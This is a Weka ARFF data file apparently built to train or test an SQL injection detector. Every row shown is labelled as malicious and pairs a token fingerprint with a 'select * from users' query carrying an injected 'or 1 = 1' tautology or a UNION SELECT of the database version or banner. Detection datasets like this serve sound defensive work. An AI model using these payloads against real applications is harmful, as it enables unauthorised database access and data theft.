@relation Test-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute sentence string
@attribute type {0,1}

@data
'\'UE1o.: select * from users where id = 1 union select 1<@.,version (  )  -- 1\'',1
'\'UE1s: select * from users where id = 1 union select 1 $$,version (  )  -- 1\'',1
'\'UEo1,: select * from users where id = 1 union select !<1,version (  )  -- 1\'',1
'\'UEoo1: select * from users where id = 1 union select +!<1,version (  )  -- 1\'',1
'\'UEoov: select * from users where id = 1 union select +!<@,version (  )  -- 1\'',1
'\'UEov,: select * from users where id = 1 union select !<@,version (  )  -- 1\'',1
'\'UEv&1: select * from users where id = 1 union select @||1,version (  )  -- 1\'',1
'\'UEv&v: select * from users where id = 1 union select @&&@,version (  )  -- 1\'',1
'\'UEv11: select * from users where id = 1 union select @ 1$,version (  )  -- 1\'',1
'\'UEv1f: select * from users where id = 1 union select  @ $,version (  )  -- 1\'',1
'\'UEv1n: select * from users where id = 1 union select @ 1a,version (  )  -- 1\'',1
'\'UEvf ( : select * from users where id = 1 union select @<@$,version (  )  -- 1\'',1
'\'UEvkn: select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1\'',1
'\'UEvn,: select * from users where id = 1 union select @ _,version (  )  -- 1\'',1
'\'UEvnn: select * from users where id = 1 union select @ $_,version (  )  -- 1\'',1
'\'UEvo,: select * from users where id = 1 union select @<@,version (  )  -- 1\'',1
'\'UEvo.: select * from users where id = 1 union select @<@.,version (  )  -- 1\'',1
'\'UEvs: select * from users where id = 1 union select @ $$,version (  )  -- 1\'',1
'n.&1c: select * from users where id = 1 +$ . or 1 = 1 -- 1',1
'\'n.UEv: select * from users where id = 1 +$ . union select null,@@VERSION -- 1\'',1
'n1&1c: select * from users where id = 1 +$ 1 or 1 = 1 -- 1',1
'\'n1UEv: select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1\'',1
'no&1c: select * from users where id = 1 +$+ or 1 = 1 -- 1',1
'no ) &1: select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',1
'\'no ) UE: select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1\'',1
'no.&1: select * from users where id = 1 +$+. or 1 = 1 -- 1',1
'\'no.UE: select * from users where id = 1 +$+. union select null,@@VERSION -- 1\'',1
'\'noUEv: select * from users where id = 1 +$+ union select null,@@VERSION -- 1\'',1
'noo&1: select * from users where id = 1 + $+\% or 1 = 1 -- 1',1
'noo1&: select * from users where id = 1 + $+\%1 or 1 = 1 -- 1',1
'\'noo1U: select * from users where id = 1 + $+\%1 union select null,@@VERSION -- 1\'',1
'\'nooUE: select * from users where id = 1 + $+* union select null,@@VERSION -- 1\'',1
'noon&: select * from users where id = 1 + $+\%$ or 1 = 1 -- 1',1
'\'noonU: select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1\'',1
'o&1c: select * from users where id = 1 <@ or 1 = 1 -- 1',1
'o (  ) &1: select * from users where id = 1 \% (  )  or 1 = 1 -- 1',1
'\'o (  ) UE: select * from users where id = 1 * (  )  union select null,@@VERSION -- 1\'',1
'o ( 1 ) &: select * from users where id = 1 \% ( 1 )  or 1 = 1 -- 1',1
'\'o ( 1 ) U: select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1\'',1
'o ( n ) &: select * from users where id = 1 \% ( $ )  or 1 = 1 -- 1',1
'o ( v ) &: select * from users where id = 1 \% ( @ )  or 1 = 1 -- 1',1
'o.&1c: select * from users where id = 1 <@. or 1 = 1 -- 1',1
'o..&1: select * from users where id = 1 <@.. or 1 = 1 -- 1',1
'\'o..UE: select * from users where id = 1<@.. union select 1,version (  )  -- 1\'',1
'\'o.UE1: select * from users where id = 1 <@. union select 1,version (  )  -- 1\'',1
'\'o.UEf: select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1\'',1
'\'o.UEv: select * from users where id = 1 *. union select null,@@VERSION -- 1\'',1
'o.n&1: select * from users where id = 1 <@.$ or 1 = 1 -- 1',1
'\'o.nUE: select * from users where id = 1 <@.$ union select 1,version (  )  -- 1\'',1
'o1&1c: select * from users where id = 1 *1 or 1 = 1 -- 1',1
'\'o1UE1: select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'o1UEv: select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1\'',1
'\'o1c: select * from users where id = 1 <1## union select 1,version (  )  -- 1\'',1
'o1n&1: select * from users where id = 1 <@1$ or 1 = 1 -- 1',1
'\'o1nUE: select * from users where id = 1 <@1$ union select 1,version (  )  -- 1\'',1
'\'oUEvc: select * from users where id = 1 * union select null,@@VERSION -- 1\'',1
'on&1c: select * from users where id = 1 <@$ or 1 = 1 -- 1',1
'on.&1: select * from users where id = 1 \%$ . or 1 = 1 -- 1',1
'\'on.UE: select * from users where id = 1 *$ . union select null,@@VERSION -- 1\'',1
'on1&1: select * from users where id = 1 \%$ 1 or 1 = 1 -- 1',1
'\'on1UE: select * from users where id = 1 \%$ 1 union select null,@@VERSION -- 1\'',1
'onn&1: select * from users where id = 1 <@$_ or 1 = 1 -- 1',1
'\'onnUE: select * from users where id = 1 <@$_ union select 1,version (  )  -- 1\'',1
'oo&1c: select * from users where id = 1 <@<@ or 1 = 1 -- 1',1
'oo1&1: select * from users where id = 1 \%!<1 or 1 = 1 -- 1',1
'\'oo1UE: select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'ooUE1: select * from users where id = 1<@<@ union select 1,version (  )  -- 1\'',1
'\'ooUEf: select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1\'',1
'\'ooUEv: select * from users where id = 1 <@<@ union select null,version (  )  -- 1\'',1
'oov&1: select * from users where id = 1 \%!<@ or 1 = 1 -- 1',1
'\'oovUE: select * from users where id = 1 <@&@ union select 1,version (  )  -- 1\'',1
'\'os: select * from users where id = 1 <@$$ union select 1,version (  )  -- 1\'',1
'ov&1c: select * from users where id = 1 &@ or 1 = 1 -- 1',1
'\'s&&o1: select * from users where id = \'1\' or ||/1 = 1 union select 1,version (  )  -- 1\'\'',1
'\'s& (  ) o: select * from users where id = \'1\' or  (  )  = 1 union select 1,@@VERSION -- 1\'\'',1
'\'s& ( . ) : select * from users where id = \'1\' or  ( . )  = 1 union select 1,@@VERSION -- 1\'\'',1
'\'s& ( 1 ) : select * from users where id = \'1\' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1\'\'',1
's&.o&: select * from users where id = \'1\' or .< or 1 = 1 -- 1\'',1
'\'s&.o1: select * from users where id = \'1\' or .<1 union select 1,@@VERSION -- 1\'\'',1
'\'s&.oU: select * from users where id = \'1\' or .< union select 1,@@VERSION -- 1\'\'',1
'\'s&.on: select * from users where id = \'1\' or .<$ union select 1,@@VERSION -- 1\'\'',1
'\'s&.oo: select * from users where id = \'1\' or .<  = 1 union select 1,@@VERSION -- 1\'\'',1
'\'s&1UE: select * from users where id = \'1\' ||1 union select 1,banner from v$version where rownum = 1 -- 1\'\'',1
's&1c: select * from users where id = \'1\'   or 1 = 1 -- 1\'',1
'\'s&1oo: select * from users where id = \'1\' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1\'\'',1
'\'s&n.o: select * from users where id = \'1\' or $ . = 1 union select 1,@@VERSION -- 1\'\'',1
's&n1&: select * from users where id = \'1\' or $ 1 = 1 or 1 = 1 -- 1\'',1
'\'s&n1U: select * from users where id = \'1\' or $ 1 = 1 union select 1,@@VERSION -- 1\'\'',1
's&no&: select * from users where id = \'1\' or $< or 1 = 1 -- 1\'',1
'\'s&no.: select * from users where id = \'1\' or $<. union select 1,@@VERSION -- 1\'\'',1
'\'s&noU: select * from users where id = \'1\' or $< union select 1,@@VERSION -- 1\'\'',1
'\'s&noo: select * from users where id = \'1\' or $+<$ union select 1,@@VERSION -- 1\'\'',1
's&o.&: select * from users where id = \'1\' or <. or 1 = 1 -- 1\'',1
'\'s&o.U: select * from users where id = \'1\' or <. union select 1,@@VERSION -- 1\'\'',1
's&o1&: select * from users where id = \'1\' or <1 or 1 = 1 -- 1\'',1
'\'s&o1U: select * from users where id = \'1\' or !<1 union select 1,version (  )  -- 1\'\'',1
'\'s&oUE: select * from users where id = \'1\' or < union select 1,@@VERSION -- 1\'\'',1
's&on&: select * from users where id = \'1\' or <$ or 1 = 1 -- 1\'',1
'\'s&onU: select * from users where id = \'1\' or <$ union select 1,@@VERSION -- 1\'\'',1
'\'s&oo1: select * from users where id = \'1\' or <  = 1 union select 1,@@VERSION -- 1\'\'',1
's&ov&: select * from users where id = \'1\' or !<@ or 1 = 1 -- 1\'',1
'\'s&ovU: select * from users where id = \'1\' or !<@ union select 1,version (  )  -- 1\'\'',1
'\'s&v ( 1: select * from users where id = \'1\' or @ ( 1 )  = 1 union select 1,version (  )  -- 1\'\'',1
'\'s&v1U: select * from users where id = \'1\' or @ 1 = 1 union select 1,version (  )  -- 1\'\'',1
'\'s&vvU: select * from users where id = \'1\' or @ @1 = 1 union select 1,version (  )  -- 1\'\'',1
'\'s (  ) s: select * from users where id = 1 or \'\' (  ) \'\' or 1 = 1 -- 1\'',1
'\'s ( ,s: select * from users where id = 1 or \'\' ( ,\'\' = 1 or 1 = 1 -- 1\'',1
'\'s ( .s: select * from users where id = 1 or \'\' ( .\'\' or 1 = 1 -- 1\'',1
'\'s ( 1s: select * from users where id = 1 or \'\' ( 1\'\' or 1 = 1 -- 1\'',1
'\'s ( :s: select * from users where id = 1 or \'\' ( :\'\' or 1 = 1 -- 1\'',1
'\'s ( ;s: select * from users where id = 1 or \'\' ( ;\'\' or 1 = 1 -- 1\'',1
'\'s ( ?s: select * from users where id = 1 or \'\' ( ]\'\' or 1 = 1 -- 1\'',1
'\'s ( UE1: select * from users where id = 1 or 1#\'\' (  union select 1,version (  )  -- 1\'',1
'\'s ( UEf: select * from users where id = 1 or 1#\'\' (  union select version (  ) ,version (  )  -- 1\'',1
'\'s ( UEs: select * from users where id = 1 or 1#\'\' (  union select \'a\',version (  )  -- 1\'',1
'\'s ( UEv: select * from users where id = 1 or 1#\'\' (  union select null,version (  )  -- 1\'',1
'\'s ( c: select * from users where id = 1 or \'\' ( #\'\' or 1 = 1 -- 1\'',1
'\'s ( n: select * from users where id = 1 or \'\' ( [\'\' or 1 = 1 -- 1\'',1
'\'s ( ns: select * from users where id = 1 or \'\' ( _\'\' or 1 = 1 -- 1\'',1
'\'s ( o1&: select * from users where id = 1 or @#\'\' (  = 1 or 1 = 1 -- 1\'',1
'\'s ( o1U: select * from users where id = 1 or @#\'\' (  = 1 union select 1,version (  )  -- 1\'',1
'\'s ( os: select * from users where id = 1 or \'\' ( &\'\' or 1 = 1 -- 1\'',1
'\'s ( v: select * from users where id = 1 or \'\' ( @\'\' or 1 = 1 -- 1\'',1
'\'s ( {s: select * from users where id = 1 or \'\' ( {\'\' or 1 = 1 -- 1\'',1
'\'s )  ( s: select * from users where id = 1 or \'\' )  ( \'\' = 1 or 1 = 1 -- 1\'',1
'\'s ) ,s: select * from users where id = 1 or \'\' ) ,\'\' or 1 = 1 -- 1\'',1
'\'s ) .s: select * from users where id = 1 or \'\' ) .\'\' = 1 or 1 = 1 -- 1\'',1
'\'s ) 1s: select * from users where id = 1 or \'\' ) 1\'\' or 1 = 1 -- 1\'',1
'\'s ) :s: select * from users where id = 1 or \'\' ) :\'\' or 1 = 1 -- 1\'',1
'\'s ) ;s: select * from users where id = 1 or \'\' ) ;\'\' or 1 = 1 -- 1\'',1
'\'s ) ?s: select * from users where id = 1 or \'\' ) ]\'\' or 1 = 1 -- 1\'',1
'\'s ) n: select * from users where id = 1 or \'\' ) [\'\' or 1 = 1 -- 1\'',1
'\'s ) ns: select * from users where id = 1 or \'\' ) $\'\' or 1 = 1 -- 1\'',1
'\'s ) v: select * from users where id = 1 or \'\' ) @\'\' or 1 = 1 -- 1\'',1
'\'s ) {s: select * from users where id = 1 or \'\' ) {\'\' or 1 = 1 -- 1\'',1
'\'s, ( s: select * from users where id = 1 or \'\', ( \'\' or 1 = 1 -- 1\'',1
'\'s, ) s: select * from users where id = 1 or \'\', ) \'\' = 1 or 1 = 1 -- 1\'',1
'\'s,,s: select * from users where id = 1 or \'\',,\'\' = 1 or 1 = 1 -- 1\'',1
'\'s,.s: select * from users where id = 1 or \'\',.\'\' or 1 = 1 -- 1\'',1
'\'s,:s: select * from users where id = 1 or \'\',:\'\' = 1 or 1 = 1 -- 1\'',1
'\'s,;s: select * from users where id = 1 or \'\',;\'\' or 1 = 1 -- 1\'',1
'\'s,?s: select * from users where id = 1 or \'\',?\'\' or 1 = 1 -- 1\'',1
'\'s,UE1: select * from users where id = 1 or 1#\'\', union select 1,version (  )  -- 1\'',1
'\'s,UEf: select * from users where id = 1 or 1#\'\', union select version (  ) ,version (  )  -- 1\'',1
'\'s,UEs: select * from users where id = 1 or 1#\'\', union select \'a\',version (  )  -- 1\'',1
'\'s,UEv: select * from users where id = 1 or 1#\'\', union select null,version (  )  -- 1\'',1
'\'s,c: select * from users where id = 1 or \'\',#\'\' or 1 = 1 -- 1\'',1
'\'s,o1&: select * from users where id = 1 or 1#\'\', = 1 or 1 = 1 -- 1\'',1
'\'s,o1U: select * from users where id = 1 or @#\'\', = 1 union select 1,version (  )  -- 1\'',1
'\'s,os: select * from users where id = 1 or \'\',&\'\' or 1 = 1 -- 1\'',1
'\'s,{s: select * from users where id = 1 or \'\',{\'\' or 1 = 1 -- 1\'',1
'\'s. ( s: select * from users where id = 1 or \'\'. ( \'\' or 1 = 1 -- 1\'',1
'\'s. ) s: select * from users where id = 1 or \'\'. ) \'\' or 1 = 1 -- 1\'',1
'\'s.,s: select * from users where id = 1 or \'\'.,\'\' or 1 = 1 -- 1\'',1
'\'s..s: select * from users where id = 1 or \'\'..\'\' = 1 or 1 = 1 -- 1\'',1
'\'s.:s: select * from users where id = 1 or \'\'.:\'\' = 1 or 1 = 1 -- 1\'',1
'\'s.;s: select * from users where id = 1 or \'\'.;\'\' or 1 = 1 -- 1\'',1
'\'s.?s: select * from users where id = 1 or \'\'.]\'\' or 1 = 1 -- 1\'',1
'\'s.UE1: select * from users where id = 1 or 1#\'\'. union select 1,version (  )  -- 1\'',1
'\'s.UEf: select * from users where id = 1 or 1#\'\'. union select version (  ) ,version (  )  -- 1\'',1
'\'s.UEs: select * from users where id = 1 or 1#\'\'. union select \'a\',version (  )  -- 1\'',1
'\'s.UEv: select * from users where id = 1 or 1#\'\'. union select null,version (  )  -- 1\'',1
'\'s.c: select * from users where id = 1 or \'\'.#\'\' or 1 = 1 -- 1\'',1
'\'s.n: select * from users where id = 1 or \'\'.[\'\' or 1 = 1 -- 1\'',1
'\'s.ns: select * from users where id = 1 or \'\'._\'\' or 1 = 1 -- 1\'',1
'\'s.o1&: select * from users where id = 1 or @#\'\'. = 1 or 1 = 1 -- 1\'',1
'\'s.o1U: select * from users where id = 1 or 1#\'\'. = 1 union select 1,version (  )  -- 1\'',1
'\'s.os: select * from users where id = 1 or \'\'.\%\'\' or 1 = 1 -- 1\'',1
'\'s.v: select * from users where id = 1 or \'\'.@\'\' or 1 = 1 -- 1\'',1
'\'s.{s: select * from users where id = 1 or \'\'.{\'\' or 1 = 1 -- 1\'',1
'\'s1 ( s: select * from users where id = 1 or \'\'1 ( \'\' = 1 or 1 = 1 -- 1\'',1
'\'s1 ) s: select * from users where id = 1 or \'\'1 ) \'\' or 1 = 1 -- 1\'',1
'\'s1: select * from users where id = 1 or \'\'1,\'\' or 1 = 1 -- 1\'',1
'\'s1:s: select * from users where id = 1 or \'\'1:\'\' or 1 = 1 -- 1\'',1
'\'s1;s: select * from users where id = 1 or \'\'1;\'\' = 1 or 1 = 1 -- 1\'',1
'\'s1?s: select * from users where id = 1 or \'\'1]\'\' or 1 = 1 -- 1\'',1
'\'s1UE1: select * from users where id = 1 or 1#\'\'1 union select 1,version (  )  -- 1\'',1
'\'s1UEf: select * from users where id = 1 or 1#\'\'1 union select version (  ) ,version (  )  -- 1\'',1
'\'s1UEs: select * from users where id = 1 or 1#\'\'1 union select \'a\',version (  )  -- 1\'',1
'\'s1UEv: select * from users where id = 1 or 1#\'\'1 union select null,version (  )  -- 1\'',1
'\'s1c: select * from users where id = 1 or \'\'1#\'\' or 1 = 1 -- 1\'',1
'\'s1n: select * from users where id = 1 or \'\'1[\'\' or 1 = 1 -- 1\'',1
'\'s1ns: select * from users where id = 1 or \'\'1_\'\' or 1 = 1 -- 1\'',1
'\'s1os: select * from users where id = 1 or \'\'1&\'\' or 1 = 1 -- 1\'',1
'\'s1{s: select * from users where id = 1 or \'\'1{\'\' or 1 = 1 -- 1\'',1
'\'s: select * from users where id = \'1\' or \'\'\'\'<@ union select 1,version (  )  -- 1\'\'',1
'\'s:&1c: select * from users where id = 1 or 1#\'\': or 1 = 1 -- 1\'',1
'\'s: ( s: select * from users where id = 1 or \'\': ( \'\' = 1 or 1 = 1 -- 1\'',1
'\'s: ) s: select * from users where id = 1 or \'\': ) \'\' = 1 or 1 = 1 -- 1\'',1
'\'s:,s: select * from users where id = 1 or \'\':,\'\' or 1 = 1 -- 1\'',1
'\'s:.s: select * from users where id = 1 or \'\':.\'\' = 1 or 1 = 1 -- 1\'',1
'\'s:1s: select * from users where id = 1 or \'\':1\'\' or 1 = 1 -- 1\'',1
'\'s:;s: select * from users where id = 1 or \'\':;\'\' = 1 or 1 = 1 -- 1\'',1
'\'s:?s: select * from users where id = 1 or \'\':]\'\' or 1 = 1 -- 1\'',1
'\'s:UE1: select * from users where id = 1 or 1#\'\': union select 1,version (  )  -- 1\'',1
'\'s:UEf: select * from users where id = 1 or 1#\'\': union select version (  ) ,version (  )  -- 1\'',1
'\'s:UEs: select * from users where id = 1 or 1#\'\': union select \'a\',version (  )  -- 1\'',1
'\'s:UEv: select * from users where id = 1 or 1#\'\': union select null,version (  )  -- 1\'',1
'\'s:c: select * from users where id = 1 or \'\':#\'\' or 1 = 1 -- 1\'',1
'\'s:n: select * from users where id = 1 or \'\':[\'\' or 1 = 1 -- 1\'',1
'\'s:ns: select * from users where id = 1 or \'\':$\'\' or 1 = 1 -- 1\'',1
'\'s:os: select * from users where id = 1 or \'\':\%\'\' or 1 = 1 -- 1\'',1
'\'s:s: select * from users where id = \'1\' union select \'\':\'\'_,version (  )  -- 1\'\'',1
'\'s:v: select * from users where id = 1 or \'\':@\'\' or 1 = 1 -- 1\'',1
'\'s:{s: select * from users where id = 1 or \'\':{\'\' or 1 = 1 -- 1\'',1
'\'s;&1c: select * from users where id = 1 or 1#\'\'; or 1 = 1 -- 1\'',1
'\'s; ( s: select * from users where id = 1 or \'\'; ( \'\' or 1 = 1 -- 1\'',1
'\'s; ) s: select * from users where id = 1 or \'\'; ) \'\' = 1 or 1 = 1 -- 1\'',1
'\'s;,s: select * from users where id = 1 or \'\';,\'\' = 1 or 1 = 1 -- 1\'',1
'\'s;.s: select * from users where id = 1 or \'\';.\'\' = 1 or 1 = 1 -- 1\'',1
'\'s;1s: select * from users where id = 1 or \'\';1\'\' or 1 = 1 -- 1\'',1
'\'s;:s: select * from users where id = 1 or \'\';:\'\' = 1 or 1 = 1 -- 1\'',1
'\'s;?s: select * from users where id = 1 or \'\';]\'\' or 1 = 1 -- 1\'',1
'\'s;UE1: select * from users where id = 1 or 1#\'\'; union select 1,version (  )  -- 1\'',1
'\'s;UEf: select * from users where id = 1 or 1#\'\'; union select version (  ) ,version (  )  -- 1\'',1
'\'s;UEs: select * from users where id = 1 or 1#\'\'; union select \'a\',version (  )  -- 1\'',1
'\'s;UEv: select * from users where id = 1 or 1#\'\'; union select null,version (  )  -- 1\'',1
'\'s;c: select * from users where id = 1 or \'\';#\'\' or 1 = 1 -- 1\'',1
'\'s;n: select * from users where id = 1 or \'\';[\'\' or 1 = 1 -- 1\'',1
'\'s;ns: select * from users where id = 1 or \'\';_\'\' or 1 = 1 -- 1\'',1
'\'s;o1&: select * from users where id = 1 or @#\'\'; = 1 or 1 = 1 -- 1\'',1
'\'s;o1U: select * from users where id = 1 or 1#\'\'; = 1 union select 1,version (  )  -- 1\'',1
'\'s;os: select * from users where id = 1 or \'\';&\'\' or 1 = 1 -- 1\'',1
'\'s;s: select * from users where id = \'1\' union select \'\';\'\'_,version (  )  -- 1\'\'',1
'\'s;v: select * from users where id = 1 or \'\';@\'\' or 1 = 1 -- 1\'',1
'\'s;{s: select * from users where id = 1 or \'\';{\'\' or 1 = 1 -- 1\'',1
'\'s?&1c: select * from users where id = 1 or 1#\'\'? or 1 = 1 -- 1\'',1
'\'s? ( s: select * from users where id = 1 or \'\'? ( \'\' or 1 = 1 -- 1\'',1
'\'s? ) s: select * from users where id = 1 or \'\'] ) \'\' or 1 = 1 -- 1\'',1
'\'s?,s: select * from users where id = 1 or \'\'?,\'\' or 1 = 1 -- 1\'',1
'\'s?,vc: select * from users where id = \'1\' union select $[\'\'],@@VERSION -- 1\'\'',1
'\'s?.s: select * from users where id = 1 or \'\'].\'\' or 1 = 1 -- 1\'',1
'\'s?1s: select * from users where id = 1 or \'\']1\'\' or 1 = 1 -- 1\'',1
'\'s?:s: select * from users where id = 1 or \'\']:\'\' or 1 = 1 -- 1\'',1
'\'s?;s: select * from users where id = 1 or \'\'?;\'\' or 1 = 1 -- 1\'',1
'\'s??s: select * from users where id = 1 or \'\'??\'\' or 1 = 1 -- 1\'',1
'\'s?UE1: select * from users where id = 1 or 1#\'\'? union select 1,version (  )  -- 1\'',1
'\'s?UEf: select * from users where id = 1 or 1#\'\'? union select version (  ) ,version (  )  -- 1\'',1
'\'s?UEs: select * from users where id = 1 or 1#\'\'? union select \'a\',version (  )  -- 1\'',1
'\'s?UEv: select * from users where id = 1 or 1#\'\'? union select null,version (  )  -- 1\'',1
'\'s?c: select * from users where id = 1 or \'\'?#\'\' or 1 = 1 -- 1\'',1
'\'s?n: select * from users where id = 1 or \'\'?[\'\' or 1 = 1 -- 1\'',1
'\'s?ns: select * from users where id = 1 or \'\'?_\'\' or 1 = 1 -- 1\'',1
'\'s?o1&: select * from users where id = 1 or 1#\'\'? = 1 or 1 = 1 -- 1\'',1
'\'s?o1U: select * from users where id = 1 or 1#\'\'? = 1 union select 1,version (  )  -- 1\'',1
'\'s?os: select * from users where id = 1 or \'\'?\%\'\' or 1 = 1 -- 1\'',1
'\'s?s: select * from users where id = \'1\' union select \'\'?\'\'_,version (  )  -- 1\'\'',1
'\'s?v: select * from users where id = 1 or \'\'?@\'\' or 1 = 1 -- 1\'',1
'\'s?{s: select * from users where id = 1 or \'\']{\'\' or 1 = 1 -- 1\'',1
'\'sUE&o: select * from users where id = \'1\' union select ||/1,version (  )  -- 1\'\'',1
'\'sUE (  ) : select * from users where id = \'1\' union select  (  ) ,@@VERSION -- 1\'\'',1
